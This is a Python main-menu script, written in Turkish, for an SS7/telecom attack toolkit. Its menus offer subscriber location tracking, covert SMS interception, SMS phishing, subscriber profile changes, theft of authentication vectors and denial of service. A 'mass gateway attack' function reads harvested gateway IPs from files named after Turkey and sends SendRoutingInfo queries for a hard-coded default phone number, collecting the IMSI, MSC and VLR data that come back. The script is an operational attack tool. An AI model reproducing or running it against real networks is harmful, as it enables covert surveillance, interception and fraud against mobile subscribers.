#!/usr/bin/env python
# encoding: utf-8
'''
SS7 main 

@author:     Loay MYK

@copyright:  2026. All rights reserved.

@license:    MIT license
'''

import os
import sys
import time
import ss7.tracking
import ss7.fraud
import ss7.interception
import ss7.dos



def cleaner():
    import glob
    for f in glob.glob("*.xml"):
        try:
            os.remove(f)
        except OSError:
            pass

def ss7tracking():
    """Konum Takibi alt menüsü."""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')

        print(" \033[31mKonum Takibi (Location Tracking)\033[0m ".center(105, "#"))
        print(" \033[34mBir mesaj secin\033[0m ".center(105, "#"))
        print()
        print("   Mesaj".rjust(10) + "\t\t\tAciklama")
        print("   --------                    ------------")
        print("0) SendRoutingInfo".rjust(21) + "\t\tKonum takibi, cagri yonlendirme (engellenebilir)")
        print("1) ProvideSubscriberInfo".rjust(27) + "\tGuvenilir konum takibi")
        print("2) SendRoutingInfoForSM".rjust(26) + "\tSMS konum takibi (HR yoksa 2 kez calistirilmali)")
        print("3) AnyTimeInterrogation".rjust(26) + "\tKonum takibi (cogu operator engeller)")
        print("4) SendRoutingInfoForGPRS".rjust(28) + "\tGPRS konum, SGSN GT alir")

        print()
        print("Geri donmek icin back yazin".rjust(30))

        choice = input(
            "\033[37m(\033[0m\033[2;31mtracking\033[0m\033[37m)>\033[0m ").strip().lower()

        if choice == "back":
            return 'sub'  # Alt menüden döndük
        elif choice == "0":
            nav = ss7.tracking.sri()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
            # 'sub' ise döngü devam eder
        elif choice == "1":
            nav = ss7.tracking.psi()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        elif choice == "2":
            nav = ss7.tracking.srism()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        elif choice == "3":
            nav = ss7.tracking.ati()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        elif choice == "4":
            nav = ss7.tracking.srigprs()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        else:
            print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0 - 4)')
            time.sleep(1.5)


def ss7interception():
    """Dinleme (Interception) alt menüsü."""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')

        print(" \033[31mDinleme (Interception)\033[0m ".center(105, "#"))
        print(" \033[34mBir mesaj secin\033[0m ".center(105, "#"))
        print()
        print("   Mesaj".rjust(10) + "\t\t\t\tAciklama")
        print("   --------                             -----------")
        print("0) UpdateLocation".rjust(20) + "\t\t\tGizli SMS dinleme")

        print()
        print("Geri donmek icin back yazin".rjust(30))

        choice = input(
            "\033[37m(\033[0m\033[2;31minterception\033[0m\033[37m)>\033[0m ").strip().lower()

        if choice == "back":
            return 'sub'
        elif choice == "0":
            nav = ss7.interception.ul()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        else:
            print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0)')
            time.sleep(1.5)


def ss7fraud():
    """Dolandırıcılık & Bilgi Toplama alt menüsü."""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')

        print(" \033[31mDolandiricilik & Bilgi Toplama\033[0m ".center(105, "#"))
        print(" \033[34mBir mesaj secin\033[0m ".center(105, "#"))
        print()
        print("   Mesaj".rjust(10) + "\t\t\t\tAciklama")
        print("   --------                            ------------")
        print("0) SendIMSI".rjust(14) + "\t\t\t\tAbone IMSI numarasini alma")
        print("1) MTForwardSMS".rjust(18) + "\t\t\tSMS oltalama ve sahte SMS")
        print("2) InsertSubscriberData".rjust(26) + "\t\tAbone profili degistirme")
        print("3) SendAuthenticationInfo".rjust(28) + "\t\tAbone kimlik dogrulama vektorleri")
        print("4) CancelLocation".rjust(20) + "\t\t\tAbone konumunu iptal et (baglanti kes)")

        print()
        print("Geri donmek icin back yazin".rjust(30))

        choice = input(
            "\033[37m(\033[0m\033[2;31mfraud\033[0m\033[37m)>\033[0m ").strip().lower()

        if choice == "back":
            return 'sub'
        elif choice == "0":
            nav = ss7.fraud.simsi()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        elif choice == "1":
            nav = ss7.fraud.mtsms()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        elif choice == "2":
            nav = ss7.fraud.isd()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        elif choice == "3":
            nav = ss7.fraud.sai()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        elif choice == "4":
            nav = ss7.fraud.cl()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        else:
            print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0-4)')
            time.sleep(1.5)


def ss7dos():
    """DoS (Servis Engelleme) alt menüsü."""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')

        print(" \033[31mDoS (Servis Engelleme)\033[0m ".center(105, "#"))
        print(" \033[34mBir mesaj secin\033[0m ".center(105, "#"))
        print()
        print("   Mesaj".rjust(10) + "\t\t\t\tAciklama")
        print("   --------                            ------------")
        print("0) PurgeMS-Subscriber DoS".rjust(28) + "\t\tToplu abone DoS saldirisi")

        print()
        print("Geri donmek icin back yazin".rjust(30))

        choice = input(
            "\033[37m(\033[0m\033[2;31mdos\033[0m\033[37m)>\033[0m ").strip().lower()

        if choice == "back":
            return 'sub'
        elif choice == "0":
            nav = ss7.dos.purge()
            if nav == 'attacks':
                return 'attacks'
            elif nav == 'main':
                return 'main'
        else:
            print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0)')
            time.sleep(1.5)


def _handle_submenu_nav(nav_result):
    """Alt menü navigasyon sonucunu işle.
    
    Returns:
        str or None: 'main' ise ana menüye dön, None ise attacksMenu döngüsünde kal
    """
    if nav_result == 'main':
        return 'main'
    # 'attacks' veya 'sub' ise attacksMenu döngüsünde kal
    return None


def attacksMenu():
    """SS7 Saldırı Kategorisi menüsü - döngü ile çalışır."""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')

        print(" \033[34mSaldiri Kategorisi Secin\033[0m ".center(105, "#"))
        print()
        print("0) Konum Takibi".rjust(18))
        print("1) Cagri ve SMS Dinleme".rjust(26))
        print("2) Dolandiricilik & Bilgi Toplama".rjust(36))
        print("3) DoS (Servis Engelleme)".rjust(28))
        print("4) Ag Kesfi (Leak Tarayici)".rjust(30))
        print("5) Coklu Protokol Tarayici (SS7+Diameter+GTP+SIP)".rjust(53))
        print("6) Diameter Saldirilari (4G/LTE)".rjust(35))
        print("7) SS7 Guvenlik Duvari Testi".rjust(31))
        print("8) Toplu Gateway Saldirisi (Tum IP'lere SRI)".rjust(48))
        print()
        print("Ana menuye donmek icin back yazin".rjust(36))
        print()

        choice = input(
            "\033[37m(\033[0m\033[2;31mattacks\033[0m\033[37m)>\033[0m ").strip().lower()

        if choice == "back":
            return  # mainMenu döngüsüne geri dön

        elif choice == "0":
            nav = ss7tracking()
            if _handle_submenu_nav(nav) == 'main':
                return

        elif choice == "1":
            nav = ss7interception()
            if _handle_submenu_nav(nav) == 'main':
                return

        elif choice == "2":
            nav = ss7fraud()
            if _handle_submenu_nav(nav) == 'main':
                return

        elif choice == "3":
            nav = ss7dos()
            if _handle_submenu_nav(nav) == 'main':
                return

        elif choice == "4":
            try:
                from ss7 import scan
                scan.scan_main()
            except ImportError as e:
                print(f"[-] Scan modulu hatasi: {e}")
                time.sleep(2)
            except Exception as e:
                print(f"[-] Hata: {e}")
                time.sleep(2)

        elif choice == "5":
            try:
                from ss7 import multi_scan
                multi_scan.multi_scan_menu()
            except ImportError as e:
                print(f"[-] Multi-scan modulu hatasi: {e}")
                time.sleep(2)
            except Exception as e:
                print(f"[-] Hata: {e}")
                time.sleep(2)

        elif choice == "6":
            try:
                from ss7.attacks import diameter_module
                diameter_module.diameter_menu()
            except ImportError as e:
                print(f"\033[33m[!] Diameter modulu yuklenemedi: {e}\033[0m")
                print("[*] Coklu Protokol Tarayici (secenek 5) ile Diameter portlari taranabilir.")
                time.sleep(2)
            except Exception as e:
                print(f"[-] Hata: {e}")
                time.sleep(2)

        elif choice == "7":
            try:
                from ss7 import firewall_test
                firewall_test.firewall_test_menu()
            except ImportError as e:
                print(f"[-] Firewall test modulu hatasi: {e}")
                time.sleep(2)
            except Exception as e:
                print(f"[-] Hata: {e}")
                time.sleep(2)

        elif choice == "8":
            _multi_gateway_attack_menu()

        else:
            print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0 - 8)')
            time.sleep(1.5)


def _multi_gateway_attack_menu():
    """Toplu gateway saldırısı - tüm bulunan IP'lere SRI gönder."""
    import sys
    import ipaddress
    print("\n" + "=" * 60)
    print(" Toplu Gateway Saldırısı")
    print(" Tüm bulunan IP'lere otomatik SRI gönderir")
    print(" 4 farklı yöntem dener: M3UA, Direct DATA, SUA, Alt-port")
    print("=" * 60 + "\n")

    # Collect targets
    targets = []
    def _is_valid_ip(value):
        try:
            ipaddress.ip_address(value)
            return True
        except ValueError:
            return False

    # Try to read from turkey_verified.txt
    verified_file = None
    for fname in ['turkey_verified.txt', 'turkey_ss7_results.txt']:
        if os.path.exists(fname):
            verified_file = fname
            break

    if verified_file:
        print(f"[+] {verified_file} okunuyor...")
        try:
            with open(verified_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('=') or line.startswith(' '):
                        continue
                    # Extract IP:port
                    import re
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
                    if match:
                        ip = match.group(1)
                        port = int(match.group(2))
                        if not _is_valid_ip(ip):
                            continue
                        if not (1 <= port <= 65535):
                            continue
                        if (ip, port) not in targets:
                            targets.append((ip, port))
        except Exception as e:
            print(f"[-] Dosya okuma hatası: {e}")

    if not targets:
        print("[-] Kayıtlı hedef bulunamadı.")
        print("[*] Manuel hedef girin:")
        ip_input = input("IP adresleri (virgülle ayır): ").strip()
        if ip_input:
            def _parse_port(raw_port):
                try:
                    port_value = int(raw_port)
                    if 1 <= port_value <= 65535:
                        return port_value
                    print(f"[!] Geçersiz port aralığı: {raw_port}")
                except ValueError:
                    print(f"[!] Geçersiz port değeri: {raw_port}")
                return None

            for ip in ip_input.split(','):
                ip = ip.strip()
                if ':' in ip:
                    parts = ip.split(':')
                    if len(parts) != 2 or not parts[0]:
                        print(f"[!] Hatalı hedef formatı: {ip}")
                        continue
                    if not _is_valid_ip(parts[0].strip()):
                        print(f"[!] Geçersiz IP: {parts[0].strip()}")
                        continue
                    parsed_port = _parse_port(parts[1].strip())
                    if parsed_port is None:
                        continue
                    targets.append((parts[0], parsed_port))
                else:
                    if not _is_valid_ip(ip):
                        print(f"[!] Geçersiz IP: {ip}")
                        continue
                    targets.append((ip, 2905))

    if not targets:
        print("[-] Hedef yok.")
        return

    # Deduplicate - keep unique IPs, prefer port 2905
    seen_ips = {}
    for ip, port in targets:
        if ip not in seen_ips:
            seen_ips[ip] = port
        elif port == 2905:
            seen_ips[ip] = 2905
    unique_targets = [(ip, port) for ip, port in seen_ips.items()]

    print(f"\n[+] {len(unique_targets)} benzersiz hedef bulundu")
    for ip, port in unique_targets[:10]:
        print(f"    {ip}:{port}")
    if len(unique_targets) > 10:
        print(f"    ... ve {len(unique_targets) - 10} daha")

    # Get attack parameters
    print("\n[+] SS7 Yapılandırması:")
    def _prompt_int(prompt, default_value, min_value=None, max_value=None):
        while True:
            raw_value = input(f"{prompt} [{default_value}]: ").strip()
            if not raw_value:
                return default_value
            try:
                value = int(raw_value)
            except ValueError:
                print("[!] Lütfen sayısal bir değer girin.")
                continue
            if min_value is not None and value < min_value:
                print(f"[!] Değer en az {min_value} olmalı.")
                continue
            if max_value is not None and value > max_value:
                print(f"[!] Değer en fazla {max_value} olmalı.")
                continue
            return value

    def _prompt_msisdn(prompt, default_value):
        while True:
            raw_value = input(f"{prompt} [{default_value}]: ").strip()
            if not raw_value:
                return default_value
            if raw_value.isdigit():
                return raw_value
            print("[!] MSISDN sadece rakamlardan oluşmalı.")

    msisdn = _prompt_msisdn("Hedef MSISDN", "905536403424")
    opc = _prompt_int("OPC", 1, min_value=0, max_value=16383)
    dpc = _prompt_int("DPC", 2, min_value=0, max_value=16383)

    # Build SRI TCAP
    try:
        from ss7.attacks.map_layer import SendRoutingInfo
        sri = SendRoutingInfo(msisdn)
        tcap_data = sri.to_tcap_begin()
    except ImportError as e:
        print(f"[-] MAP layer import hatası: {e}")
        print("[*] ss7/attacks/map_layer.py dosyasını kontrol edin.")
        return

    print(f"\n[+] MSISDN: {msisdn}")
    print(f"[+] MAP: SendRoutingInfo (OpCode: 22)")
    print(f"[+] TCAP Size: {len(tcap_data)} bytes")

    confirm = input(f"\n[?] {len(unique_targets)} hedefe saldırı başlatılsın mı? [E/h]: ").strip()
    if confirm.lower() in ('h', 'n', 'hayir', 'no'):
        print("[*] İptal edildi.")
        return

    # Execute
    try:
        from ss7.attacks.tcp_transport import multi_gateway_attack
    except ImportError as e:
        print(f"[-] TCP transport import hatası: {e}")
        print("[*] ss7/attacks/tcp_transport.py dosyasını kontrol edin.")
        return

    results = multi_gateway_attack(unique_targets, opc, dpc, tcap_data)

    # Summary
    print("\n" + "=" * 60)
    print(" SONUÇ ÖZETİ")
    print("=" * 60)
    if results:
        print(f"\n\033[32m[+] {len(results)} gateway yanıt verdi!\033[0m\n")
        for r in results:
            ip = r.get('ip', '?')
            port = r.get('port', '?')
            method = r.get('method', 'M3UA')
            print(f"  \033[32m[+] {ip}:{port} ({method})\033[0m")
            if r.get('imsi'):
                print(f"      IMSI: {r['imsi']}")
            if r.get('msc'):
                print(f"      MSC:  {r['msc']}")
            if r.get('vlr'):
                print(f"      VLR:  {r['vlr']}")

        save_choice = input("\n[?] Sonuçlar dosyaya kaydedilsin mi? [E/h]: ").strip().lower()
        if save_choice not in ('h', 'n', 'hayir', 'no'):
            output_name = input("Dosya adı [ss7_gateway_results.txt]: ").strip() or "ss7_gateway_results.txt"
            try:
                with open(output_name, "w", encoding="utf-8") as f:
                    for r in results:
                        ip = r.get('ip', '?')
                        port = r.get('port', '?')
                        method = r.get('method', 'M3UA')
                        imsi = r.get('imsi', '')
                        msc = r.get('msc', '')
                        vlr = r.get('vlr', '')
                        f.write(f"{ip}:{port} {method} IMSI={imsi} MSC={msc} VLR={vlr}\n")
                print(f"[+] Sonuçlar kaydedildi: {output_name}")
            except OSError as e:
                print(f"[-] Dosya yazma hatası: {e}")

    else:
        print(f"\n\033[31m[-] Hiçbir gateway yanıt vermedi.\033[0m")
        print("[*] Tüm gateway'ler SS7 firewall ile korunuyor.")
        print("[*] GRX/IPX ağına erişim olmadan bu gateway'lere ulaşılamaz.")

    input("\nDevam etmek için Enter'a basın...")
